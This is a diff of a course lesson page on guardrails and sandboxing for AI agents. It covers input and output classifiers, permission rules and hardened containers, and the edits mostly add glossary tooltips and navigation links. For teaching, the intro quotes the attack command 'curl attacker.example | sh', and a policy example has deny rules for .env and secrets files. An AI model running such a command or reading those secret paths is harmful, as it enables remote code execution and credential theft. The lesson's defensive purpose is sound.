@@ -29,7 +29,7 @@
 </header>
 <div class="mobile-nav" hidden>
   <a href="curriculum.html">Curriculum</a><a href="paths.html">Paths</a><a href="lab.html">Lab</a><a href="glossary.html">Glossary</a><a href="papers.html">Reading List</a><a href="cheatsheet.html">Cheat Sheet</a>
-  <a href="progress.html">Progress</a><a href="flashcards.html">Flashcards</a><a href="exam.html">Practice Exam</a>
+  <a href="progress.html">Progress</a><a href="review.html">Course review</a><a href="flashcards.html">Flashcards</a><a href="exam.html">Practice Exam</a>
 </div>
 <div class="layout-lesson">
 <aside class="sidebar" aria-label="Course navigation">
@@ -82,6 +82,7 @@
       <summary><span class="side-mod-icon">🛠️</span><span class="side-mod-title"><small>Module 5</small>Building Agents</span><span class="side-mod-count" data-module-count="building"></span></summary>
       <ol>
         <li><a href="build-agent-from-scratch.html" data-slug="build-agent-from-scratch"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Build an Agent From Scratch</span></a></li>
+        <li><a href="agent-frameworks.html" data-slug="agent-frameworks"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Frameworks &amp; SDKs Compared</span></a></li>
         <li><a href="sdk-hands-on.html" data-slug="sdk-hands-on"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Hands-On with Agent SDKs</span></a></li>
       </ol>
     </details>
@@ -115,6 +116,7 @@
     <div class="side-extra">
       <a href="cheatsheet.html">📋 Cheat sheet</a>
       <a href="glossary.html">📖 Glossary</a>
+      <a href="review.html">🧠 Course review</a>
       <a href="flashcards.html">🃏 Flashcards</a>
       <a href="exam.html">🎓 Practice exam</a>
     </div>
@@ -130,7 +132,7 @@
       <span>⏱ 35 min</span>
       <span>✅ 6-question quiz</span>
       
-      <span>Lesson 33 of 37</span>
+      <span>Lesson 34 of 38</span>
       <span class="lesson-status" data-status-for="guardrails-and-sandboxing"></span>
     </div>
   </header>
@@ -140,8 +142,8 @@
   </section>
   <article class="prose">
 <p>In <a href="agent-security.html">Agent Security &amp; Prompt Injection</a> we reached an uncomfortable conclusion: you cannot make a language model reliably refuse every malicious instruction it reads. So what <em>do</em> you do? You do what security engineers have always done with components they can&#39;t fully trust: you surround them with <strong>controls that don&#39;t depend on the component behaving well</strong>.</p>
-<p>A coding agent that can run shell commands is, from a security standpoint, <em>remote code execution as a service</em>. That&#39;s not a criticism — it&#39;s exactly what makes it useful. The engineering question is how to let it run <code>pytest</code> and <code>npm install</code> a thousand times a day while ensuring that the one time it&#39;s tricked into running <code>curl attacker.example | sh</code>, nothing bad happens: no secrets leak, no production system is touched, nothing persists.</p>
-<p>This lesson is the practical toolkit: <strong>guardrails</strong> that screen what goes in and comes out, <strong>permission systems</strong> that decide which actions run, and <strong>sandboxes</strong> that contain whatever runs anyway. Along the way we&#39;ll build a policy-checked tool executor in Python and a hardened <code>docker run</code> invocation you can adapt.</p>
+<p>A <dfn class="gt" tabindex="0" data-t="Coding agent" data-d="An agent that reads, writes and runs code in a repository, using tools such as file editing, search, a shell and tests to complete software tasks." data-l="coding-agents" data-a="coding-agent">coding agent</dfn> that can run shell commands is, from a security standpoint, <em>remote code execution as a service</em>. That&#39;s not a criticism — it&#39;s exactly what makes it useful. The engineering question is how to let it run <code>pytest</code> and <code>npm install</code> a thousand times a day while ensuring that the one time it&#39;s tricked into running <code>curl attacker.example | sh</code>, nothing bad happens: no secrets leak, no production system is touched, nothing persists.</p>
+<p>This lesson is the practical toolkit: <strong><dfn class="gt" tabindex="0" data-t="Guardrail" data-d="A check that runs alongside or around the model, such as input or output classifiers, policy rules or schema validation, to block unsafe, off-topic or malformed behavior." data-a="guardrail">guardrails</dfn></strong> that screen what goes in and comes out, <strong>permission systems</strong> that decide which actions run, and <strong>sandboxes</strong> that contain whatever runs anyway. Along the way we&#39;ll build a policy-checked tool executor in Python and a hardened <code>docker run</code> invocation you can adapt.</p>
 <h2 id="defense-in-depth"><a class="anchor" href="#defense-in-depth" aria-hidden="true">#</a>Defense in Depth</h2>
 <p><strong>Defense in depth</strong> means stacking independent layers so that an attack must defeat <em>all</em> of them. It&#39;s often pictured as the &quot;Swiss cheese model&quot;: each slice has holes, but holes rarely line up.</p>
 <p>For agents, the layers are:</p>
@@ -157,7 +159,7 @@
 <tbody><tr>
 <td>Model</td>
 <td>Does the model itself resist misuse?</td>
-<td>Safety training, instruction hierarchy</td>
+<td>Safety training, <dfn class="gt" tabindex="0" data-t="Instruction hierarchy" data-d="Training models to prioritize instructions by privilege, system over user over third-party content (Wallace et al., 2024), to resist injected instructions." data-l="agent-security" data-a="instruction-hierarchy">instruction hierarchy</dfn></td>
 <td>Probabilistic</td>
 </tr>
 <tr>
@@ -210,7 +212,7 @@
 <p><strong>Input guardrails</strong> inspect content <em>before</em> the model acts on it. That includes the user&#39;s message and, crucially for agents, tool results and retrieved documents.</p>
 <ul>
 <li><strong>Content moderation</strong>: classify inputs against harm categories (violence, sexual content involving minors, self-harm, etc.). Most providers offer moderation endpoints or built-in safety systems; many apps add their own.</li>
-<li><strong>Jailbreak and injection classifiers</strong>: small, fast models trained to recognize attempts to override instructions. Run them on <em>tool outputs</em> as well as user turns, since indirect injection arrives through tools.</li>
+<li><strong><dfn class="gt" tabindex="0" data-t="Jailbreak" data-d="An input crafted to make a model violate its own safety policies. Unlike prompt injection, the attacker is usually the user." data-l="agent-security" data-a="jailbreak">Jailbreak</dfn> and injection classifiers</strong>: small, fast models trained to recognize attempts to override instructions. Run them on <em>tool outputs</em> as well as user turns, since indirect injection arrives through tools.</li>
 <li><strong>PII detection</strong>: find names, emails, phone numbers, card numbers or health data, then mask, tokenize or block them before they reach a third-party model or a log. Tools range from regex plus checksum validation (Luhn for card numbers) to NER-based libraries like Microsoft Presidio.</li>
 <li><strong>Topic scoping</strong>: keep a narrow agent on task. A banking support agent can decline requests to write poetry or discuss competitors. Implement with a cheap classifier or a fast model call returning an enum.</li>
 </ul>
@@ -221,15 +223,15 @@
 <li><strong>Tier your checks</strong>: regex and allowlists first (microseconds), small classifiers next (milliseconds), LLM judges only for ambiguous cases.</li>
 <li><strong>Fail closed for high-stakes paths</strong> (if the injection classifier is down, don&#39;t let browsing results reach an agent with payment tools) and <strong>fail open for low-stakes ones</strong> (a topic classifier outage shouldn&#39;t break a FAQ bot).</li>
 </ul>
-<aside class="callout callout-warning"><div class="callout-title"><span class="callout-icon" aria-hidden="true">⚠️</span>Classifier scores are not verdicts</div><div class="callout-body"><p>An injection classifier with a 1% false-negative rate still lets through one in a hundred attacks, and attackers get unlimited tries. It will also flag legitimate content — a security wiki page <em>about</em> prompt injection looks a lot like an attack. Route detections to logging, quarantine or human confirmation, and tune thresholds on your own traffic.</p>
+<aside class="callout callout-warning"><div class="callout-title"><span class="callout-icon" aria-hidden="true">⚠️</span>Classifier scores are not verdicts</div><div class="callout-body"><p>An injection classifier with a 1% false-negative rate still lets through one in a hundred attacks, and attackers get unlimited tries. It will also flag legitimate content — a security wiki page <em>about</em> <dfn class="gt" tabindex="0" data-t="Prompt injection" data-d="An attack in which text crafted by an attacker is interpreted by the model as instructions, overriding the developer's or user's intent." data-l="agent-security" data-a="prompt-injection">prompt injection</dfn> looks a lot like an attack. Route detections to logging, quarantine or human confirmation, and tune thresholds on your own traffic.</p>
 </div></aside>
 <h2 id="output-guardrails"><a class="anchor" href="#output-guardrails" aria-hidden="true">#</a>Output Guardrails</h2>
 <p><strong>Output guardrails</strong> inspect what the model produces before it reaches a user, a downstream system or a tool.</p>
 <ul>
-<li><strong>Policy checks</strong>: does the response violate content policy, make commitments the business can&#39;t honor (&quot;I&#39;ve approved your refund&quot; when it can&#39;t), or give regulated advice? Often a classifier or a rubric-graded LLM judge.</li>
+<li><strong>Policy checks</strong>: does the response violate content policy, make commitments the business can&#39;t honor (&quot;I&#39;ve approved your refund&quot; when it can&#39;t), or give regulated advice? Often a classifier or a rubric-graded <dfn class="gt" tabindex="0" data-t="LLM-as-a-judge" data-d="Using a language model with a rubric to grade outputs that lack a simple programmatic check. Judges must be validated against human labels and watched for biases." data-l="evaluating-agents" data-a="llm-as-a-judge">LLM judge</dfn>.</li>
 <li><strong>PII and secret redaction</strong>: scan for credentials (API-key patterns, private-key headers, high-entropy strings), internal hostnames and personal data before text leaves the system. This is also an <em>exfiltration</em> control.</li>
-<li><strong>Groundedness checks</strong>: for RAG and research agents, verify each claim is supported by a retrieved source — using an entailment (NLI) model or an LLM judge that checks claims against citations. Unsupported claims get removed, flagged or sent back for revision. See <a href="rag-and-retrieval.html">RAG &amp; Retrieval</a>.</li>
-<li><strong>Schema validation</strong>: every tool call and structured output is validated against a schema <em>in code</em>, regardless of whether the model was constrained. Reject or repair invalid output rather than passing it on. <a href="structured-outputs.html">Structured Outputs</a> covers constrained decoding, which makes this cheap.</li>
+<li><strong>Groundedness checks</strong>: for <dfn class="gt" tabindex="0" data-t="Retrieval-augmented generation" data-d="Retrieving relevant documents from an external corpus at query time and placing them in the prompt so the model answers from them (Lewis et al., 2020)." data-l="rag-and-retrieval" data-a="retrieval-augmented-generation">RAG</dfn> and research agents, verify each claim is supported by a retrieved source — using an entailment (NLI) model or an LLM judge that checks claims against citations. Unsupported claims get removed, flagged or sent back for revision. See <a href="rag-and-retrieval.html">RAG &amp; Retrieval</a>.</li>
+<li><strong>Schema validation</strong>: every tool call and structured output is validated against a schema <em>in code</em>, regardless of whether the model was constrained. Reject or repair invalid output rather than passing it on. <a href="structured-outputs.html">Structured Outputs</a> covers <dfn class="gt" tabindex="0" data-t="Constrained decoding" data-d="Enforcing a grammar or schema at generation time by masking tokens that would violate it, guaranteeing syntactically valid structured output." data-l="structured-outputs" data-a="constrained-decoding">constrained decoding</dfn>, which makes this cheap.</li>
 <li><strong>Safe rendering</strong>: escape HTML, neutralize markdown images and links to unknown domains, and never <code>eval</code> model output. This is OWASP&#39;s &quot;Improper Output Handling.&quot;</li>
 </ul>
 <h2 id="the-guardrail-toolbox"><a class="anchor" href="#the-guardrail-toolbox" aria-hidden="true">#</a>The Guardrail Toolbox</h2>
@@ -264,7 +266,7 @@
 </tr>
 <tr>
 <td><strong>Constitutional Classifiers</strong> (Anthropic)</td>
-<td>Input and output classifiers trained on synthetic data generated from a natural-language &quot;constitution&quot; of allowed and disallowed content</td>
+<td>Input and output classifiers trained on <dfn class="gt" tabindex="0" data-t="Synthetic data" data-d="Training or evaluation data generated by models rather than collected from humans, such as synthetic tool-use dialogues or task variations." data-l="training-agents" data-a="synthetic-data">synthetic data</dfn> generated from a natural-language &quot;constitution&quot; of allowed and disallowed content</td>
 <td>Blocking universal jailbreaks for high-risk domains (e.g., CBRN)</td>
 </tr>
 <tr>
@@ -358,7 +360,7 @@ SHELL_META = <span class="hljs-built_in">set</span>(<span class="hljs-string">&q
             <span class="hljs-keyword">return</span> {<span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-variable language_">self</span>.tools[tool](**args), <span class="hljs-string">&quot;is_error&quot;</span>: <span class="hljs-literal">False</span>}
         <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                    <span class="hljs-comment"># tool failures go back to the model</span>
             <span class="hljs-keyword">return</span> {<span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">f&quot;<span class="hljs-subst">{<span class="hljs-built_in">type</span>(e).__name__}</span>: <span class="hljs-subst">{e}</span>&quot;</span>, <span class="hljs-string">&quot;is_error&quot;</span>: <span class="hljs-literal">True</span>}</code></pre></div>
-<p>Wiring it into a manual agent loop (see <a href="tool-use.html">Tool Use</a>) is one line per tool call — the returned dict becomes a <code>tool_result</code> block:</p>
+<p>Wiring it into a manual <dfn class="gt" tabindex="0" data-t="Agent loop" data-d="The core cycle of an agent: call the model, execute any tools it requests, feed the results back, and repeat until the model produces a final answer or a stopping condition (step, time or cost budget) is hit." data-l="the-agent-loop" data-a="agent-loop">agent loop</dfn> (see <a href="tool-use.html">Tool Use</a>) is one line per tool call — the returned dict becomes a <code>tool_result</code> block:</p>
 <div class="code-block"><div class="code-head"><span class="code-lang">python</span><button type="button" class="copy-btn" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-python">rules = [
     Rule(<span class="hljs-string">&quot;read_file&quot;</span>, <span class="hljs-string">&quot;*/.env*&quot;</span>, <span class="hljs-string">&quot;deny&quot;</span>),
     Rule(<span class="hljs-string">&quot;read_file&quot;</span>, <span class="hljs-string">&quot;*/secrets/*&quot;</span>, <span class="hljs-string">&quot;deny&quot;</span>),
@@ -514,7 +516,7 @@ docker run --<span class="hljs-built_in">rm</span> \
 <li><strong>No ambient credentials.</strong> Don&#39;t inherit the developer&#39;s shell environment, cloud CLI profile or SSH agent into the agent&#39;s process.</li>
 <li><strong>Network off unless needed</strong>, then allowlisted.</li>
 <li><strong>Dangerous modes are loud.</strong> If you offer a &quot;skip all permissions&quot; mode (as many coding agents do, for use inside disposable sandboxes), name it scarily, warn on use, and refuse to enable it outside an isolated environment where feasible.</li>
-<li><strong>Pin and verify dependencies</strong>: model versions, MCP server versions, container image digests, package lockfiles.</li>
+<li><strong>Pin and verify dependencies</strong>: model versions, <dfn class="gt" tabindex="0" data-t="MCP server" data-d="A program that exposes tools, resources and prompts over the Model Context Protocol, for example wrapping a database, a SaaS API or the local filesystem." data-l="protocols-mcp-a2a" data-a="mcp-server">MCP server</dfn> versions, container image digests, package lockfiles.</li>
 <li><strong>Separate environments</strong>: agents operate on dev/staging data and propose changes to production through reviewed channels (pull requests, change tickets), not direct writes. See <a href="deployment.html">Deployment</a>.</li>
 </ul>
 <h2 id="auditing"><a class="anchor" href="#auditing" aria-hidden="true">#</a>Auditing</h2>
@@ -696,7 +698,7 @@ docker run --<span class="hljs-built_in">rm</span> \
       <p>A free, open, comprehensive course on AI agents — from first principles to production and the research frontier.</p></div>
     <div class="footer-cols">
       <div><h4>Learn</h4><a href="curriculum.html">Curriculum</a><a href="paths.html">Learning paths</a><a href="lab.html">Interactive lab</a></div>
-      <div><h4>Practice</h4><a href="flashcards.html">Flashcards</a><a href="exam.html">Practice exam</a><a href="progress.html">Your progress</a></div>
+      <div><h4>Practice</h4><a href="review.html">Course review</a><a href="flashcards.html">Flashcards</a><a href="exam.html">Practice exam</a><a href="progress.html">Your progress</a></div>
       <div><h4>Reference</h4><a href="glossary.html">Glossary</a><a href="papers.html">Reading list</a><a href="cheatsheet.html">Cheat sheet</a><a href="about.html">About</a></div>
     </div>
   </div>
